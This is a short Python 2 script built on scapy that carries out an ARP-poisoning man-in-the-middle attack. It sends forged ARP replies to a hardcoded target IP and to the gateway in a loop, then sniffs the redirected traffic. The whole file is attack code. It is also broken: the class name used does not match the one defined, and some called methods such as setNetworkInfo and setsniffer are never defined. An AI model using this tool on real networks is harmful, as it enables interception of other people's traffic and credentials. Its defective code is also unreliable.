import commands
import sys
import netifaces
import logging
import time
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

def getBash(command):
    return commands.getoutput(command)
    
class enrjf_sniffer:

    target_ip = ""

    def setPosion(self):
        result = getBash("arping -I "+dev+" -c 1 "+self.target_ip+" | grep 'reply from "+self.target_ip+"' | awk -F ' ' '{print $5}'")
        self.target_mac = str.lower(result[1:-1])

    def arpPoisoning(self):
        self.gatewayARP = Ether(dst = gateway_mac, src = self.target_mac)/ARP(op = "is-at", hwsrc = my_mac, psrc = self.target_ip)
        self.targetARP = Ether(dst = self.target_mac, src = gateway_mac)/ARP(op = "is-at", hwsrc = my_mac, psrc = gateway_ip)

        print "\nForwarding target: %s to  MAC %s"%(self.target_ip, my_mac)
        print "Forwarding target: %s to MAC %s"%(gateway_ip, my_mac)

        sendp(self.gatewayARP, verbose = 0, inter = 1)
        sendp(self.targetARP, verbose = 0, inter = 1)
        

    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.setsniffer()

if __name__=="__main__":

    global dev
    global my_ip
    global my_mac
    global gateway_ip
    global gateway_mac

    sys.argv = ["spoofer.py", "192.168.110.132"]

    setNetworkInfo()
    spoofer = enrjf_spoofer(sys.argv[1])

    while True:
        spoofer.arpPoisoning()
        sniff()
        time.sleep(1)
